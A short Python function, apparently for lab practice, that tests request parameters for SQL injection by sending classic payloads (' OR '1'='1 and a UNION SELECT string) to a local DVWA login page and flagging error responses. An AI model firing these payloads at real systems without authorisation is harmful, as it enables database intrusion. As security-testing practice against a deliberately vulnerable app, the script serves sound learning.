def test_sql_injection(url, params):
    payloads = ["' OR '1'='1", "' UNION SELECT NULL --"]
    for param in params:
        for payload in payloads:
            test_data = params.copy()
            test_data[param] = payload
            response = requests.get(url, params=test_data)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"Possible SQL Injection on parameter: {param} with payload: {payload}")

# Test
test_sql_injection("http://localhost/dvwa/login.php", {"username": "", "password": ""})
